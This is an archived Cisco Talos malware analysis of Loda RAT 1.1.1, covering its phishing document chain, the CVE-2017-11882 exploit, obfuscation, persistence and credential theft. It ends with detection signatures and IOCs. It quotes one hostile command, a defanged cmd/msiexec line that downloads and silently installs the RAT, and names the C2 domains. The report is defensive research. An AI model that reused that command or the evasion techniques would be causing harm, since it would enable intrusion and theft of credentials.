{
    "id": "b24759a2-bf62-4b94-81ff-9b9e13c52c5b",
    "created_at": "2023-01-12T15:02:43.196646Z",
    "updated_at": "2025-03-27T02:06:00.407997Z",
    "deleted_at": null,
    "sha1_hash": "918fd7f17e441f208a288a8811e1378e225ae243",
    "title": "2020-02-12 - Loda RAT Grows Up",
    "authors": "",
    "file_creation_date": "2022-05-28T16:53:06Z",
    "file_modification_date": "2022-05-28T16:53:06Z",
    "file_size": 1705409,
    "plain_text": "# Loda RAT Grows Up\n\n**[blog.talosintelligence.com/2020/02/loda-rat-grows-up.html](https://blog.talosintelligence.com/2020/02/loda-rat-grows-up.html)**\n\nBy [Chris Neal.](https://twitter.com/g0jirasan)\n\nOver the past several months, Cisco Talos has observed a malware campaign that\nutilizes websites hosting a new version of Loda, a remote access trojan (RAT) written in\nAutoIT.\n\n\n-----\n\nThese websites also host malicious documents that begin a multi-stage infection chain\nwhich ultimately serves a malicious MSI file. The second stage document exploits\n[CVE-2017-11882 to download and run the MSI file, which contains Loda version 1.1.1.](https://nvd.nist.gov/vuln/detail/CVE-2017-11882)\nThis campaign appears to be targeting countries in South America and Central\nAmerica, as well as the U.S.\n\n### What's New?\n\nTalos has observed several changes in this version of Loda. The obfuscation technique used\nwithin the AutoIT script changed to a different form of string encoding. Multiple persistence\nmechanisms have been employed to ensure Loda continues running on the infected host\nfollowing reboots. Lastly, the new version leverages WMI to enumerate antivirus solutions\nrunning on the infected host.\n\n### How Did it Work?\n\nThe Loda sample analyzed in this post is delivered via a document chain. The first contains\nan OOXML relationship to a second document that contains an exploit. Once the exploit is\ntriggered, an MSI file that contains the Loda RAT is downloaded to the target host and\nexecuted. While the main purpose of this RAT is to steal usernames, passwords, and\ncookies saved within browsers, it also has keylogging, sound recording, screenshotting and\nthe ability to allow the threat actor to send messages to the infected host.\n\n\n-----\n\n### So What?\n\nLoda is a simple, yet effective, RAT that has matured over time. This RAT is a good example\nof how effective relatively simple techniques combined with basic obfuscation can be. The\ntechniques this malware employs are of fairly low complexity and show that slight changes in\nimplementation can significantly reduce detection rates.\n\n## The Campaign\n\nTelemetry from Cisco Umbrella shows that this campaign is quite active and seems to be\ntargeting countries in South America, Central America and the U.S. The majority of the\nqueries to the C2 domain \"4success[.]zapto[.]org\" originate from Brazil, Costa Rica and the\nUnited States. Similarly, the queries to \"success20[.]hopto[.]org\" originate from Argentina,\nBrazil and the United States. Our telemetry also shows that C2 communications go as far\nback as the last quarter of 2019.\n\n\n-----\n\nDNS queries to 4success[.]zapto[.]org\n\nDNS queries to success20[.]hopto[.]org\n\n### Infection chain\n\nAt the time of analysis, several steps of the infection chain had a relatively low detection rate\ndue to various obfuscation techniques. The initial document is delivered via a phishing email\nthat contains the first-stage document as an attachment.\n\n\n-----\n\nExample of an email from this campaign\n\nThe first document in the infection chain, titled in one instance \"comprobante de confirmación\nde pago.docx\" contains an OOXML relationship, located in \"/word/_rels\" that points to a\nsecond document at \"http://lcodigo[.]com/apiW/config/uploads/tmp/documento.doc\". Aside\nfrom this OOXML relationship, the initial document isn't particularly noteworthy. The\ndocument uses this two-stage document technique to bypass some email filters.\n\nOOXML Relationship\n\nThe second document is a Rich Text Format document that contains a payload within an\nobfuscated OLE object which is then executed by exploiting CVE-2017-11882, an arbitrary\ncode execution vulnerability in some versions of Microsoft Office. The contents of the Author\nfield, \"obidah qudah\" in the metadata of this document appears to be constant across all\nsamples analyzed during the investigation.\n\nWhen we looked deeper into this author's name, we discovered they have a relatively long\nhistory of being associated with malicious RTF documents. Starting in 2017, there have been\njust under 1,300 malicious documents submitted to VirusTotal that contain \"obidah qudah\" in\nthe author field. An overwhelming majority of these submissions are RTF documents that\nexploit CVE-2017-11882.\n\n\n-----\n\nHowever, the Last Modified By field is not static throughout these documents. There appear\nto be multiple campaigns over the last few years, starting in 2017, that use the \"obidah\nqudah\" author name, with each campaign using a different \"Last Modified By\" field, with\nmany serving malware other than Loda. It is unclear whether these campaigns were initiated\nby the same threat actor, or if a single malicious RTF document builder was used by multiple\ndifferent actors. In the documents analyzed in this post, the \"Last Modified By\" value is set to\n\"Richard.\"\n\nAuthor labeled as \"obidah qudah\"\n\nThe OLE object within this document that contains the exploit and payload employs an\ninteresting obfuscation technique that utilizes RTF control words.\n\n\n-----\n\nObfuscated payload\n\nThe control word \"\\par\" used in the object indicates the end of a paragraph, while the \"\\*\" has\na slightly more complex function. The \"\\*\" control word instructs an RTF reader to ignore the\nfollowing control words only if they are not understood by the reader, which allows the author\nto include false control words (ex: \\par67234). Using this technique to break up the OLE\nobject not only obfuscates the payload but also does not allow RTF parsers to read the\nobject in its entirety. Once it is executed, the control words will be ignored, concatenating the\nbytes in between into the exploit payload as shown below.\n\nDeobfuscated payload\n\nWithin this payload, the command \"cmd.exe & /C CD C: & msiexec.exe /i\nhttp://lcodigo[.]com/apiW/config/uploads/tmp/fkrkdn.msi /quiet\" can be seen. Once the exploit\nis triggered, a malicious MSI file is then downloaded and executed.\n\n\n-----\n\nThis MSI was created using Exe2Msi, a common tool used to repackage Windows\nexecutables as an MSI file. Although this tool is most often used with legitimate software, it is\nalso frequently used by malware authors. One of the benefits of delivering malware in an\nMSI package is that it provides a lower detection rate. Simply repackaging a malicious\nexecutable as an MSI file can reduce detection rates with very little effort. If repackaged as\nan MSI, the detection rate of a malicious executable can drop by up to 50 percent on\nVirusTotal. Combined with other forms of obfuscation, this can result in a crude, yet effective,\nmeans of evasion.\n\n## The malware\n\nAt execution, \"fkrkdn.msi\" extracts an executable at \"C:\\Users\\\n<user>\\AppData\\Roaming\\Windata\\JLMWFF.exe.\" This is the Loda 1.1.1 binary, which is a\ncompiled AutoIT script. A detailed write-up by Proofpoint on a previous version of Loda and\n[its functionality can be found here.](https://www.proofpoint.com/us/threat-insight/post/introducing-loda-malware)\n\nThe initial C2 beacon was captured from \"JLMWFF.exe\" which contained the unique\nsignature \"ZeXro0\" repeated several times, which is not present in other versions of Loda.\nThe C2 comms pointed to \"4success[.]zapto[.]org\" contain information about the infected\nhost, including OS version, architecture and username. This also reveals that this version of\nLoda is \"1.1.1.\" Aside from the unique signature, this beacon format is the same as previous\nversions.\n\nEven though this new version of Loda has nearly identical functionality as previous versions,\nthere are significant differences in implementation and design. Some of the functions within\nthe script have been completely rewritten, with the most readily apparent change being the\nobfuscation technique used. In version 1.1.1, almost every string or variable is obfuscated\nusing the simple encoding algorithm shown below.\n\nLoda's encoding algorithm\n\nThere are a few key changes in functionality in version 1 1 1 To detect what antivirus\n\n\n-----\n\nsoftware is running on the host, earlier versions of Loda would call the AutoIT function\nPROCESSEXISTS() for each antivirus software process name. Loda 1.1.1 now makes a\nWMI query to \"winmgmts:\\\\localhost\\root\\SecurityCenter2\" to enumerate installed antivirus\nsolutions, as shown below in the deobfuscated code:\n\nAV enumeration function\n\nFor persistence, the new version now adds both a registry key and a scheduled task:\n\nPersistence mechanism\n\nA new capability this version has is the ability to read the contents of\n\"\\filezilla\\recentservers.xml\". This document contains the IP addresses, usernames and\npasswords of servers that Filezilla has recently connected to. It is important to note that\nthese passwords are stored in either plaintext or encoded in base64.\n\nOne interesting functionality that persists through the versions of Loda is the command\n\"QURAN\". This command streams music from \"live.mp3quran[.]net:9976\" in Windows Media\nPlayer using the Microsoft Media Server (MMS) protocol. MMS is a deprecated Microsoft\nproprietary network streaming protocol used to stream media in Windows Media Player.\n\n\"QURAN\" command function\n\nThere is no other functionality to this command other than playing the music that is streaming\nat this URL to the infected host.\n\n## Conclusion\n\n\n-----\n\nAlthough the functionality of this new version of Loda is similar to previous versions, this new\niteration is a slightly more well-developed RAT. Loda is simple yet has proven to be effective,\nand poses a serious threat to an infected host. The credential stealing capabilities could lead\nto significant financial loss or a potential data breach. By changing the obfuscation\ntechniques the threat actor was able to lower the detection rate considerably. The change in\npersistence mechanisms and AV solution detection show that the malware authors are\nactively improving the functionality of Loda.\n\n## Coverage\n\n### Snort\n\n[SID] 53031\n\n### ClamAV\n\nWin.Packed.LokiBot-6963314-0\n\nDoc.Exploit.Cve_2017_11882-7570663-1\n\nDoc.Downloader.Loda-7570590-0\n\nAdditional ways our customers can detect and block this threat are listed below.\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the](https://www.cisco.com/c/en/us/products/security/advanced-malware-protection)\nmalware used by these threat actors.\n\n[Cisco Cloud Web Security (CWS) or](https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html) [Web Security Appliance (WSA) web scanning prevents](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\naccess to malicious websites and detects malware used in these attacks.\n\n[Email Security can block malicious emails sent by threat actors as part of their campaign.](https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html)\n\n\n-----\n\n[Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\n[Intrusion Prevention System (NGIPS), andMeraki MX can detect malicious activity](https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html)\nassociated with this threat.\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\nproducts.\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs, and URLs, whether users are on or off the corporate network.\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.](https://www.snort.org/products)\n\n## IOCs:\n\nhttp://lcodigo[.]com/apiW/config/uploads/tmp/documento.doc\n\nhttp://lcodigo[.]com/apiW/config/uploads/tmp/fkrkdn.msi\n\nhttp://lcodigo[.]com/apiW/config/uploads/tmp/kctlqz.msi\n\nhttp://drinkfoodapp[.]com/AdminDF/assets/img/app/settings.doc\n\nhttp://drinkfoodapp.com/AdminDF/assets/img/app/grcfne.msi\n\nhttp://yewonder[.]com/wp-content/plugins/ltfhmam/eklnxx.msi\n\nhttps://www[.]miracleworkstudios[.]com/wp-content/uploads/2019/12/app/updates.doc\n\nhttp://wp[.]168gamer[.]com/secured/mcsonb.msi\n\nhttp://wp[.]168gamer[.]com/secured/office.doc\n\n### Docs:\n\nb5df816986a73e890f41ff0c0470a2208df523f17eb4eac9c5f0546da2ec161e\n\naf42191fe2ea328080939ec656302a8f364dac44b5cd8277dcbaeb15ff499178\n36865059f1c142ba1846591aae8d78d8a109a0dc327a88547e41e3663bad2eaf\ne15336491ab57a16a870edd5b135014b62387cb45e4e490b9d4091c54394dec4\n\n### MSI:\n\n9edd2bfdb0c177f046cec1392d31ee3f67174e0a23fdf7e4b6fd580e769f0493\n\n8b989db4a9f8c3f0fa825cca35386ac4be4e33fd2ea53a118d4f4dd8259aeccc\n\n633f3970c31c9cb849bd5f66c3a783538bb2327b4bec5774b870f8b3b53ea3c1\n\nC65668958c5dfeccb40abd0771c17d045f24c78f51ea6c3955e110f53ad8eece\n\n740a5c19645d5a90fc1e11c84f5d6a058dc50206337aa37bbc783bd54ba84a79\n\n6cb47f2ecd58349ffe65d7ea281eea2ebd231bbaac30843f872ae2249bd140b0\n\n\n-----\n\n### C2:\n\n4success[.]zapto[.]org\n\nsuccess20[.]hopto[.]org\n\nbreakthrough[.]hopto[.]org\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-12 - Loda RAT Grows Up.pdf"
    ],
    "report_names": [
        "2020-02-12 - Loda RAT Grows Up.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535763,
    "ts_updated_at": 1743041160,
    "ts_creation_date": 1653756786,
    "ts_modification_date": 1653756786,
    "files": {
        "pdf": "https://archive.orkl.eu/918fd7f17e441f208a288a8811e1378e225ae243.pdf",
        "text": "https://archive.orkl.eu/918fd7f17e441f208a288a8811e1378e225ae243.txt",
        "img": "https://archive.orkl.eu/918fd7f17e441f208a288a8811e1378e225ae243.jpg"
    }
}